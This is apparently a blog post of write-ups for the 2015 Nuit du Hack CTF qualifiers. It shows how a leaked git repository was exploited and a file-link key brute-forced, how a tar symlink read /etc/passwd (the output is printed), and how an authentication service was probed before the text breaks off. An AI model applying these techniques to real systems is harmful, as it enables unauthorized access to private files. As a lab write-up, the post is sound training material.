<!DOCTYPE html>
<html class="no-js">
<head>
    <meta charset="utf-8">
    <title>CTF NDH Qualifications | maggick's logs</title>

    <meta name="author" content="maggick">
    <meta name="description" content="">
    <meta name="robots" content="">
        <meta name="keywords" content="">
        <meta property="og:title" content="">
        <meta property="og:description" content="">
        <meta property="og:url" content="">
        <meta property="og:image" content="">
    <meta property="og:site_name" content="maggick's logs">
    <meta property="og:type" content="website">

    <meta name="viewport" content="width=device-width, initial-scale=1.0">

        <link rel="icon" type="image/x-icon" href="https://maggick.fr/media/favicon.ico">

        <link href="feeds/all.atom.xml" rel="alternate" title="maggick's logs" type="application/atom+xml">

    <link rel="canonical" href="">

    <link rel="stylesheet" href="../../theme/css/pure-min.css">
    <link rel="stylesheet" href="../../theme/css/main.css">
</head>
<body>
<div id="page" class="full-entry">
    <header class="pure-g-r header">
        <div class="pure-u-1">
            <div class="wrapper">
                <div class="l-box">
                    <a href="../../index.html" title="Home page"
                            class="logo">maggick's
<span class="secondary">logs</span>                    </a>
                </div>
            </div>

<nav class="pure-menu pure-menu-open pure-menu-horizontal menu">
    <ul>
            <li>
              |
            </li>
                <li>
                    <a href="../../pages/about.html">About</a>
                </li>
                <li>
                    <a href="../../pages/notes.html">Notes</a>
                </li>
    </ul>
</nav>        </div>
    </header>

    <div class="pure-g-r wrapper">
        <section class="content pure-u-17-24">
            <div class="l-box">

<article class="entry">

    <header class="entry-header">
        <h1 class="entry-title">
      <a href="../../2015/04/ctf-ndh-qualifications.html" title="Read more" class="entry-title-link">
                CTF NDH Qualifications</a>
        </h1>

        <div class="entry-date">
            <time datetime="2015-04-07T00:00:00+02:00">07 Apr 2015</time>
        </div>

    <div class="entry-meta">
      <span class="meta entry-author">
        <span class="icons icons-author"></span>
        <a href="../../author/maggick.html" title="Read more posts from maggick" class="meta-link">maggick</a>
      </span>

      <span class="meta entry-tags">
        <span class="icons icons-category"></span>
          <a href="../../tag/ndh.html" title="Read more with the label ndh" class="meta-link">ndh</a> 
          <a href="../../tag/ctf.html" title="Read more with the label ctf" class="meta-link">ctf</a> 
          <a href="../../tag/security.html" title="Read more with the label security" class="meta-link">security</a> 
      </span>
              <span class="meta entry-tags">
              <p style="text-align:right; color:#aaaaaa; ">&nbsp Estimated read time: 17 minutes</p></span>
    </div>
    </header>

    <div class="entry-content">
            <p><img class="align-left" src="/media/2015.04/ndh_logo.png" alt="Logo NDH"
width="202"></p>
<p>This weekend (4 April 2015) take place the qualification round for
<a href="https://nuitduhack.com/en/">"Nuit du Hack" CTF</a> from 00:01 to 23:59. It was a
Jeopardy CTF.</p>
<p>I have participated with the <a href="http://www.zenk-security.com/">Zenk-Security</a> team.
At the end we got the 7th position and are qualified for the final which would
be a Attack-Defense CTF in Paris in June.</p>
<p>I publish here the ones for the challenges I participated to and make a writeup
of. All the writeup for this CTF are
<a href="http://wiki.zenk-security.com/doku.php?id=ndh_2015_quals">accessible here (in french)</a>.</p>


<p>This article is a bit long, so here is the list of the available writeup :</p>
<h1 id="menu">Menu:</h1>
<ul>
<li><a href="#facebox">FaceBox</a></li>
<li><a href="#facesec">FaceSec</a></li>
<li><a href="#secureauth">SecureAuth</a></li>
<li><a href="#updator">Updator</a></li>
<li><a href="#raptor">Raptor</a></li>
</ul>
<h1 id="facebox">FaceBox</h1>
<p>Web   | 100 points  | http://quals.nuitduhack.com/challenges/view/10</p>
<p>http://prod.facebox.challs.nuitduhack.com/</p>
<h2 id="statement">Statement</h2>
<p>*A shady company decided to write their own software for storing files in the
cloud.</p>
<p>"No no no, this is OUR filebox. We decline any responsability in the usage of our
filebox. In any event your files get lost, trashed, stolen or spy on : it's
your fault, not ours."</p>
<p>You are investigating on the security of their cloud storage as it might have
disastrous consequences if it were to get hacked by malicious actors.*</p>
<h2 id="challenge">Challenge</h2>
<p>The website prod.facebox.challs.nuitduhack.com allow us to create an account and
log ourself. Then we can upload files on the server both in public and private
mod. In this case the link to the file is hide to the other users.</p>
<h3 id="file-upload">File Upload</h3>
<p>We tried to upload files and execute some code on the server. It was a
waste of time. Then we think that if there was a prod, there should also be a
dev.</p>
<h3 id="dev">dev</h3>
<p>With http://dev.facebox.challs.nuitduhack.com/ we found a git project with the
following tree:</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>http://dev.facebox.challs.nuitduhack.com/.git/config</span>
<span class="code-line">http://dev.facebox.challs.nuitduhack.com/.git/COMMIT_EDITMSG</span>
<span class="code-line">http://dev.facebox.challs.nuitduhack.com/.git/HEAD</span>
<span class="code-line">http://dev.facebox.challs.nuitduhack.com/.git/refs/heads/master</span>
<span class="code-line">http://dev.facebox.challs.nuitduhack.com/.git/logs/</span>
<span class="code-line"></code></pre></div>

<p>The page http://dev.facebox.challs.nuitduhack.com/.git/COMMIT_EDITMSG show the
last commit messages: <em>hash generation function</em></p>
<p>We can easily retrieve all files on this repository with <code>rip-git.pl</code>:
https://github.com/ctfs/write-ups-2014/tree/master/9447-ctf-2014/tumorous
https://raw.githubusercontent.com/kost/dvcs-ripper/master/rip-git.pl</p>
<h3 id="a-bit-of-python">A bit of python</h3>
<p>With <code>rip-git.pl</code> we found the python script that generate the link of the
uploaded files:</p>
<div class="highlight"><pre><span class="code-line"><span></span><code><span class="ch">#!/usr/bin/env python</span></span>
<span class="code-line"><span class="c1"># -*- coding: utf-8 -*-</span></span>
<span class="code-line"></span>
<span class="code-line"></span>
<span class="code-line"><span class="k">def</span> <span class="nf">generate_random_filename</span><span class="p">(</span><span class="n">user_id</span><span class="p">,</span><span class="n">filename</span><span class="p">):</span></span>
<span class="code-line">    <span class="n">dbuser</span> <span class="o">=</span> <span class="n">users</span><span class="o">.</span><span class="n">query</span><span class="o">.</span><span class="n">filter_by</span><span class="p">(</span><span class="nb">id</span><span class="o">=</span><span class="n">user_id</span><span class="p">)</span><span class="o">.</span><span class="n">first</span><span class="p">()</span></span>
<span class="code-line"></span>
<span class="code-line">    <span class="k">if</span> <span class="n">dbuser</span><span class="o">.</span><span class="n">privkey</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span><span class="p">:</span></span>
<span class="code-line">        <span class="k">return</span> <span class="n">md5</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">dbuser</span><span class="o">.</span><span class="n">privkey</span><span class="p">)</span><span class="o">+</span><span class="n">filename</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span></span>
<span class="code-line">    <span class="k">else</span><span class="p">:</span></span>
<span class="code-line">        <span class="n">privkey</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">randint</span><span class="p">(</span><span class="mi">10000000</span><span class="p">,</span><span class="mi">99999999</span><span class="p">))</span></span>
<span class="code-line">        <span class="n">upd</span> <span class="o">=</span> <span class="n">users</span><span class="o">.</span><span class="n">query</span><span class="o">.</span><span class="n">filter_by</span><span class="p">(</span><span class="nb">id</span><span class="o">=</span><span class="n">user_id</span><span class="p">)</span><span class="o">.</span><span class="n">first</span><span class="p">()</span></span>
<span class="code-line">        <span class="n">upd</span><span class="o">.</span><span class="n">privkey</span> <span class="o">=</span> <span class="n">privkey</span></span>
<span class="code-line">        <span class="n">db</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">commit</span><span class="p">()</span></span>
<span class="code-line">    <span class="k">return</span> <span class="n">md5</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">privkey</span><span class="p">)</span><span class="o">+</span><span class="n">filename</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span></span>
<span class="code-line"></code></pre></div>

<h3 id="private-file">Private file</h3>
<p>We have been asked to test the application security. The private file access
seems a interesting vulnerability. The first two files were probably upload by
the staff.
Then we will try to get the <strong>confidentials.txt</strong> file upload by the user koffi.
Hopfuly a second file was upload by this user: <strong>paste1.txt</strong> at the address
http://prod.facebox.challs.nuitduhack.com/files/view/3686d78a6e9d5258773a6ae0469d3ed4</p>
<p>In order to find the private key of the koffi user, we quickly inverse the
previous script and we brute force the private key in order to found the good
link with the url of the <strong>paste1.txt</strong> file:</p>
<div class="highlight"><pre><span class="code-line"><span></span><code><span class="kn">import</span> <span class="nn">hashlib</span></span>
<span class="code-line"></span>
<span class="code-line"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10000000</span><span class="p">,</span><span class="mi">100000000</span><span class="p">):</span></span>
<span class="code-line">        <span class="k">if</span><span class="p">((</span><span class="n">i</span> <span class="o">%</span> <span class="mi">10000000</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">):</span></span>
<span class="code-line">                <span class="nb">print</span> <span class="s2">&quot;</span><span class="si">%d</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">i</span><span class="p">)</span></span>
<span class="code-line">        <span class="k">if</span><span class="p">(</span><span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="s2">&quot;paste01.txt&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span> <span class="o">==</span> <span class="s2">&quot;3686d78a6e9d5258773a6ae0469d3ed4&quot;</span><span class="p">):</span></span>
<span class="code-line">                <span class="nb">print</span> <span class="s2">&quot;privkey found: </span><span class="si">%d</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">i</span><span class="p">)</span></span>
<span class="code-line"></span>
<span class="code-line"><span class="nb">print</span> <span class="s2">&quot;Done!&quot;</span></span>
<span class="code-line"></code></pre></div>

<p>Result: <strong>privkey found: 95594864</strong></p>
<p>With this private key we applied the algorithm to the <strong>crendentials.txt</strong> file:</p>
<div class="highlight"><pre><span class="code-line"><span></span><code><span class="kn">import</span> <span class="nn">hashlib</span></span>
<span class="code-line"></span>
<span class="code-line"></span>
<span class="code-line"><span class="k">def</span> <span class="nf">generate_random_filename</span><span class="p">(</span><span class="n">user_id</span><span class="p">,</span><span class="n">filename</span><span class="p">):</span></span>
<span class="code-line"></span>
<span class="code-line">    <span class="n">privkey</span> <span class="o">=</span> <span class="mi">95594864</span></span>
<span class="code-line">    <span class="nb">print</span><span class="p">(</span><span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">privkey</span><span class="p">)</span><span class="o">+</span><span class="n">filename</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">())</span></span>
<span class="code-line"></span>
<span class="code-line"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span></span>
<span class="code-line">    <span class="n">generate_random_filename</span><span class="p">(</span><span class="s2">&quot;koffi&quot;</span><span class="p">,</span> <span class="s2">&quot;confidentials.txt&quot;</span><span class="p">)</span></span>
<span class="code-line"></code></pre></div>

<p>Result: <strong>35e2cb0b2e8bd40347ecd4e32767a060</strong></p>
<p>We have the complete url to access the private file:
http://prod.facebox.challs.nuitduhack.com/files/view/35e2cb0b2e8bd40347ecd4e32767a060</p>
<p><strong>Flag: M4x_M4i5_DR</strong></p>
<h1 id="facesec">FaceSec</h1>
<p>Web   | 100 points  | http://quals.nuitduhack.com/challenges/view/11</p>
<p>http://facesec.challs.nuitduhack.com/</p>
<h2 id="statement_1">Statement</h2>
<p>*"Hello there,</p>
<p>We are looking for a developer or security consultant to secure our filebox
system. We stumbled upon your LinkedIn profile and it seems like you would be a
perfect candidate for this job. Could you please send us your CV and Motivation
letter?</p>
<p>Thanks,</p>
<p>faceSec HR Director."*</p>
<h2 id="challenge_1">Challenge</h2>
<p>This challenge allow us to register an account and then upload text file as
resume and motivation letter in order to apply for a job.
We can also upload a compressed file (tar) with a cv.txt and a motiv.txt in
order to upload both files at the same time.</p>
<h3 id="facebook">Facebook</h3>
<p>This challenge looks like the Facebook vulnerability discover last December:
http://josipfranjkovic.blogspot.fr/2014/12/reading-local-files-from-facebooks.html
nevertheless we must upload a .tar file instead of a .zip file.</p>
<h3 id="a-bit-of-symbolic-link">A bit of symbolic link</h3>
<p>We create a <code>cv.txt</code> file with a symbolic link to <code>/etc/passwd</code> and a
<code>motiv.txt</code> file with random content and then tar the two files:</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>ln -s /etc/passwd cv.txt</span>
<span class="code-line">echo plop &gt; motiv.txt</span>
<span class="code-line">tar cvf tar.tar *.txt</span>
<span class="code-line">    cv.txt</span>
<span class="code-line">    motiv.txt</span>
<span class="code-line"></code></pre></div>

<p>We upload the file <code>tar.tar</code> and we get as excepted the <code>/etc/passwd</code> file from
the server:</p>
<div class="highlight"><pre><span class="code-line"><span></span><code><span class="n">root</span><span class="o">:</span><span class="n">x</span><span class="o">:</span><span class="mi">0</span><span class="o">:</span><span class="mi">0</span><span class="o">:</span><span class="n">root</span><span class="o">:/</span><span class="n">root</span><span class="o">:/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span><span class="w"></span></span>
<span class="code-line"><span class="n">daemon</span><span class="o">:</span><span class="n">x</span><span class="o">:</span><span class="mi">1</span><span class="o">:</span><span class="mi">1</span><span class="o">:</span><span class="n">daemon</span><span class="o">:/</span><span class="n">usr</span><span class="sr">/sbin:/bin/sh bin:x:2:2:bin:/bin:/bin/s</span><span class="n">h</span><span class="w"></span></span>
<span class="code-line"><span class="n">sys</span><span class="o">:</span><span class="n">x</span><span class="o">:</span><span class="mi">3</span><span class="o">:</span><span class="mi">3</span><span class="o">:</span><span class="n">sys</span><span class="o">:/</span><span class="n">dev</span><span class="o">:/</span><span class="n">bin</span><span class="sr">/sh sync:x:4:65534:sync:/bin:/bin/s</span><span class="n">ync</span><span class="w"></span></span>
<span class="code-line"><span class="n">games</span><span class="o">:</span><span class="n">x</span><span class="o">:</span><span class="mi">5</span><span class="o">:</span><span class="mi">60</span><span class="o">:</span><span class="n">games</span><span class="o">:/</span><span class="n">usr</span><span class="sr">/games:/bin/s</span><span class="n">h</span><span class="w"></span></span>
<span class="code-line"><span class="n">man</span><span class="o">:</span><span class="n">x</span><span class="o">:</span><span class="mi">6</span><span class="o">:</span><span class="mi">12</span><span class="o">:</span><span class="n">man</span><span class="o">:/</span><span class="n">var</span><span class="sr">/cache/man:/bin/s</span><span class="n">h</span><span class="w"></span></span>
<span class="code-line"><span class="n">lp</span><span class="o">:</span><span class="n">x</span><span class="o">:</span><span class="mi">7</span><span class="o">:</span><span class="mi">7</span><span class="o">:</span><span class="n">lp</span><span class="o">:/</span><span class="n">var</span><span class="sr">/spool/lpd:/bin/s</span><span class="n">h</span><span class="w"></span></span>
<span class="code-line"><span class="n">mail</span><span class="o">:</span><span class="n">x</span><span class="o">:</span><span class="mi">8</span><span class="o">:</span><span class="mi">8</span><span class="o">:</span><span class="n">mail</span><span class="o">:/</span><span class="n">var</span><span class="sr">/mail:/bin/s</span><span class="n">h</span><span class="w"></span></span>
<span class="code-line"><span class="n">news</span><span class="o">:</span><span class="n">x</span><span class="o">:</span><span class="mi">9</span><span class="o">:</span><span class="mi">9</span><span class="o">:</span><span class="n">news</span><span class="o">:/</span><span class="n">var</span><span class="sr">/spool/news:/bin/s</span><span class="n">h</span><span class="w"></span></span>
<span class="code-line"><span class="n">uucp</span><span class="o">:</span><span class="n">x</span><span class="o">:</span><span class="mi">10</span><span class="o">:</span><span class="mi">10</span><span class="o">:</span><span class="n">uucp</span><span class="o">:/</span><span class="n">var</span><span class="sr">/spool/uucp:/bin/s</span><span class="n">h</span><span class="w"></span></span>
<span class="code-line"><span class="n">proxy</span><span class="o">:</span><span class="n">x</span><span class="o">:</span><span class="mi">13</span><span class="o">:</span><span class="mi">13</span><span class="o">:</span><span class="n">proxy</span><span class="o">:/</span><span class="n">bin</span><span class="o">:/</span><span class="n">bin</span><span class="o">/</span><span class="n">sh</span><span class="w"></span></span>
<span class="code-line"><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="o">:</span><span class="n">x</span><span class="o">:</span><span class="mi">33</span><span class="o">:</span><span class="mi">33</span><span class="o">:</span><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="o">:/</span><span class="n">var</span><span class="sr">/www:/bin/s</span><span class="n">h</span><span class="w"></span></span>
<span class="code-line"><span class="n">backup</span><span class="o">:</span><span class="n">x</span><span class="o">:</span><span class="mi">34</span><span class="o">:</span><span class="mi">34</span><span class="o">:</span><span class="n">backup</span><span class="o">:/</span><span class="n">var</span><span class="sr">/backups:/bin/s</span><span class="n">h</span><span class="w"></span></span>
<span class="code-line"><span class="n">list</span><span class="o">:</span><span class="n">x</span><span class="o">:</span><span class="mi">38</span><span class="o">:</span><span class="mi">38</span><span class="o">:</span><span class="n">Mailing</span><span class="w"> </span><span class="n">List</span><span class="w"></span></span>
<span class="code-line"><span class="n">Manager</span><span class="o">:/</span><span class="n">var</span><span class="sr">/list:/bin/s</span><span class="n">h</span><span class="w"></span></span>
<span class="code-line"><span class="n">irc</span><span class="o">:</span><span class="n">x</span><span class="o">:</span><span class="mi">39</span><span class="o">:</span><span class="mi">39</span><span class="o">:</span><span class="n">ircd</span><span class="o">:/</span><span class="n">var</span><span class="sr">/run/ircd:/bin/s</span><span class="n">h</span><span class="w"></span></span>
<span class="code-line"><span class="n">gnats</span><span class="o">:</span><span class="n">x</span><span class="o">:</span><span class="mi">41</span><span class="o">:</span><span class="mi">41</span><span class="o">:</span><span class="n">Gnats</span><span class="w"></span></span>
<span class="code-line"><span class="n">Bug</span><span class="o">-</span><span class="n">Reporting</span><span class="w"> </span><span class="n">System</span><span class="w"> </span><span class="o">(</span><span class="n">admin</span><span class="o">):/</span><span class="n">var</span><span class="sr">/lib/gnats:/bin/s</span><span class="o">)</span><span class="w"></span></span>
<span class="code-line"><span class="n">nobody</span><span class="o">:</span><span class="n">x</span><span class="o">:</span><span class="mi">65534</span><span class="o">:</span><span class="mi">65534</span><span class="o">:</span><span class="n">nobody</span><span class="o">:/</span><span class="n">nonexistent</span><span class="o">:/</span><span class="n">bin</span><span class="o">/</span><span class="n">sh</span><span class="w"></span></span>
<span class="code-line"><span class="n">libuuid</span><span class="o">:</span><span class="n">x</span><span class="o">:</span><span class="mi">100</span><span class="o">:</span><span class="mi">101</span><span class="o">::/</span><span class="n">var</span><span class="sr">/lib/libuuid:/bin/s</span><span class="n">h</span><span class="w"></span></span>
<span class="code-line"><span class="n">sshd</span><span class="o">:</span><span class="n">x</span><span class="o">:</span><span class="mi">101</span><span class="o">:</span><span class="mi">65534</span><span class="o">::/</span><span class="n">var</span><span class="sr">/run/sshd:/usr/sbin/</span><span class="n">nologin</span><span class="w"></span></span>
<span class="code-line"><span class="n">facesec</span><span class="o">:</span><span class="n">x</span><span class="o">:</span><span class="mi">1000</span><span class="o">:</span><span class="mi">1000</span><span class="o">:</span><span class="n">W00tSymL1nkAttackStillW0rksIn2k15</span><span class="o">:/</span><span class="n">home</span><span class="sr">/facesec:/bin/s</span><span class="n">h</span><span class="w"></span></span>
<span class="code-line"></code></pre></div>

<p>The flag is the content of the <code>User ID Info</code> of the facesec user.</p>
<p><strong>Flag: W00tSymL1nkAttackStillW0rksIn2k15</strong></p>
<h1 id="secureauth">SecureAuth</h1>
<p><strong>Thank to <a href="https://twitter.com/_Spl3en">Spl3en</a> who redacte this writeup before me.</strong></p>
<p>Exploit | 350 points | http://quals.nuitduhack.com/challenges/view/16</p>
<h2 id="statement_2">Statement</h2>
<p>*"There is a building. Inside this building there is a level where no elevator
can go, and no stair can reach. This level is filled with doors. These doors
lead to many places. Hidden places. But one door is special. One door leads to
the source." (The Keymaker)</p>
<p>Find the key. Open the door.
Static client @ http://static.challs.nuitduhack.com/SecureAuthClient.tar.gz*</p>
<h2 id="challenge_2">Challenge</h2>
<p>The tar.gz file contain the following python program:</p>
<div class="highlight"><pre><span class="code-line"><span></span><code><span class="kn">import</span> <span class="nn">socket</span></span>
<span class="code-line"><span class="kn">from</span> <span class="nn">hashlib</span> <span class="kn">import</span> <span class="n">sha256</span></span>
<span class="code-line"><span class="k">class</span> <span class="nc">SecureConnect_Client</span><span class="p">():</span></span>
<span class="code-line">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span></span>
<span class="code-line">        <span class="bp">self</span><span class="o">.</span><span class="n">sock</span> <span class="o">=</span> <span class="kc">None</span></span>
<span class="code-line">        <span class="bp">self</span><span class="o">.</span><span class="n">username</span> <span class="o">=</span> <span class="kc">None</span></span>
<span class="code-line">        <span class="bp">self</span><span class="o">.</span><span class="n">password</span> <span class="o">=</span> <span class="kc">None</span></span>
<span class="code-line"></span>
<span class="code-line">    <span class="k">def</span> <span class="nf">connect</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span></span>
<span class="code-line">        <span class="bp">self</span><span class="o">.</span><span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span></span>
<span class="code-line">        <span class="bp">self</span><span class="o">.</span><span class="n">sock</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s2">&quot;151.80.18.93&quot;</span><span class="p">,</span> <span class="mi">4241</span><span class="p">))</span></span>
<span class="code-line"></span>
<span class="code-line">    <span class="k">def</span> <span class="nf">login</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span></span>
<span class="code-line">        <span class="bp">self</span><span class="o">.</span><span class="n">username</span> <span class="o">=</span> <span class="n">username</span></span>
<span class="code-line">        <span class="bp">self</span><span class="o">.</span><span class="n">password</span> <span class="o">=</span> <span class="n">password</span></span>
<span class="code-line">        <span class="n">challenge</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">get_challenge</span><span class="p">()</span></span>
<span class="code-line">        <span class="n">authpacket</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">process_authpacket</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">,</span> <span class="n">challenge</span><span class="p">)</span></span>
<span class="code-line">        <span class="nb">print</span> <span class="s2">&quot;[~] Sending auth packet...&quot;</span></span>
<span class="code-line">        <span class="bp">self</span><span class="o">.</span><span class="n">sock</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">authpacket</span><span class="p">)</span></span>
<span class="code-line"></span>
<span class="code-line">    <span class="k">def</span> <span class="nf">get_challenge</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span></span>
<span class="code-line">        <span class="n">data</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span></span>
<span class="code-line">        <span class="k">if</span> <span class="n">data</span><span class="p">[:</span><span class="mi">9</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;CHALLENGE&quot;</span><span class="p">:</span></span>
<span class="code-line">            <span class="nb">print</span> <span class="s2">&quot;[~] Server sent challenge : </span><span class="si">%s</span><span class="s2"> !&quot;</span> <span class="o">%</span> <span class="n">data</span><span class="p">[</span><span class="mi">10</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span></span>
<span class="code-line">            <span class="k">return</span> <span class="n">data</span><span class="p">[</span><span class="mi">10</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span></span>
<span class="code-line">        <span class="k">raise</span> <span class="ne">Exception</span><span class="p">(</span><span class="s2">&quot;Bad challenge...&quot;</span><span class="p">)</span></span>
<span class="code-line"></span>
<span class="code-line">    <span class="k">def</span> <span class="nf">process_authpacket</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">authtoken</span><span class="p">,</span> <span class="n">challenge</span><span class="p">):</span></span>
<span class="code-line">        <span class="n">packet</span> <span class="o">=</span> <span class="s2">&quot;AUTH </span><span class="si">%s</span><span class="s2">|</span><span class="si">%s</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">sha256</span><span class="p">(</span><span class="n">sha256</span><span class="p">(</span><span class="n">authtoken</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span> <span class="o">+</span> <span class="n">challenge</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">())</span></span>
<span class="code-line">        <span class="nb">print</span> <span class="s2">&quot;[+] Auth data : </span><span class="si">%s</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">packet</span></span>
<span class="code-line">        <span class="k">return</span> <span class="n">packet</span></span>
<span class="code-line"></span>
<span class="code-line">    <span class="k">def</span> <span class="nf">get_response</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span></span>
<span class="code-line">        <span class="nb">print</span> <span class="bp">self</span><span class="o">.</span><span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span></span>
<span class="code-line">        <span class="nb">print</span> <span class="bp">self</span><span class="o">.</span><span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span></span>
<span class="code-line"></span>
<span class="code-line">    <span class="k">def</span> <span class="nf">close</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span></span>
<span class="code-line">        <span class="bp">self</span><span class="o">.</span><span class="n">sock</span><span class="o">.</span><span class="n">close</span><span class="p">()</span></span>
<span class="code-line"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span></span>
<span class="code-line">    <span class="n">scc</span> <span class="o">=</span> <span class="n">SecureConnect_Client</span><span class="p">()</span></span>
<span class="code-line">    <span class="n">scc</span><span class="o">.</span><span class="n">connect</span><span class="p">()</span></span>
<span class="code-line">    <span class="n">scc</span><span class="o">.</span><span class="n">login</span><span class="p">(</span><span class="s2">&quot;username&quot;</span><span class="p">,</span> <span class="s2">&quot;password&quot;</span><span class="p">)</span></span>
<span class="code-line">    <span class="n">scc</span><span class="o">.</span><span class="n">get_response</span><span class="p">()</span></span>
<span class="code-line">    <span class="n">scc</span><span class="o">.</span><span class="n">close</span><span class="p">()</span></span>
<span class="code-line"></code></pre></div>

<p>We execute the code:</p>
<div class="highlight"><pre><span class="code-line"><span></span><code><span class="c">spl3en@box:~$ python SecureAuthClient</span><span class="nt">.</span><span class="c">py</span></span>
<span class="code-line"><span class="k">[</span><span class="c">~</span><span class="k">]</span><span class="c"> Server sent challenge : gOg0gySNyDbKCKD5oT6SLEdG4fEgkNXntk5uQ1m1XtZzIvMT62bcqMgmB6ei5HVI !</span></span>
<span class="code-line"><span class="k">[</span><span class="nb">+</span><span class="k">]</span><span class="c"> Auth data : AUTH username|7b98c028fc42ee7bc830948b036571f8327279b6929b4f598891ed608edbfbd9</span></span>
<span class="code-line"><span class="k">[</span><span class="c">~</span><span class="k">]</span><span class="c"> Sending auth packet</span><span class="nt">...</span><span class="c"></span></span>
<span class="code-line"><span class="k">[</span><span class="c">!</span><span class="k">]</span><span class="c"> Authentification Error : Invalid username</span><span class="nt">.</span><span class="c"></span></span>
<span class="code-line"><span class="k">[</span><span class="nb">-</span><span class="k">]</span><span class="c"> Bad password or authentification error</span><span class="nt">...</span><span class="c"> !</span></span>
<span class="code-line"></code></pre></div>

<h3 id="admin">admin</h3>
<p>By replacing <code>username</code> by <code>admin</code> we got a different message allowing us to
think that we got the right user:</p>
<div class="highlight"><pre><span class="code-line"><span></span><code><span class="c">spl3en@box:~$ python SecureAuthClient</span><span class="nt">.</span><span class="c">py</span></span>
<span class="code-line"><span class="k">[</span><span class="c">~</span><span class="k">]</span><span class="c"> Server sent challenge : GRlJD0cTH7RQFPQ5TUNQRQZVmLrxejFNsDPYFF0LWZKvBJLvFwAvN0YDPvU9AMGV !</span></span>
<span class="code-line"><span class="k">[</span><span class="nb">+</span><span class="k">]</span><span class="c"> Auth data : AUTH admin|febb7f8cec097ba5636da95ded1b019030483436385584297bbf64e1bf828acb</span></span>
<span class="code-line"><span class="k">[</span><span class="c">~</span><span class="k">]</span><span class="c"> Sending auth packet</span><span class="nt">...</span><span class="c"></span></span>
<span class="code-line"><span class="k">[</span><span class="nb">+</span><span class="k">]</span><span class="c"> Welcome Administrator we are verifying your password</span><span class="nt">...</span><span class="c"></span></span>
<span class="code-line"><span class="k">[</span><span class="nb">-</span><span class="k">]</span><span class="c"> Bad password or authentification error</span><span class="nt">...</span><span class="c"> !</span></span>
<span class="code-line"></code></pre></div>

<h3 id="errors">Errors</h3>
<p>Moreover, when playing with the username value, for instance by putting
<code>username"</code> we got the following message:</p>
<div class="highlight"><pre><span class="code-line"><span></span><code><span class="c">spl3en@box:~$ python SecureAuthClient</span><span class="nt">.</span><span class="c">py</span></span>
<span class="code-line"><span class="k">[</span><span class="c">~</span><span class="k">]</span><span class="c"> Server sent challenge : uJ2A8UE1WMwYCgWDmOMZSVirPWQoxhWAVeECAwWOVUxXD9q6qqvqGPSpolKr5KX1 !</span></span>
<span class="code-line"><span class="k">[</span><span class="nb">+</span><span class="k">]</span><span class="c"> Auth data : AUTH username&#39;|a932aed6531ebf37074484e10611499007dadd6c42f69649a242302c09245792</span></span>
<span class="code-line"><span class="k">[</span><span class="c">~</span><span class="k">]</span><span class="c"> Sending auth packet</span><span class="nt">...</span><span class="c"></span></span>
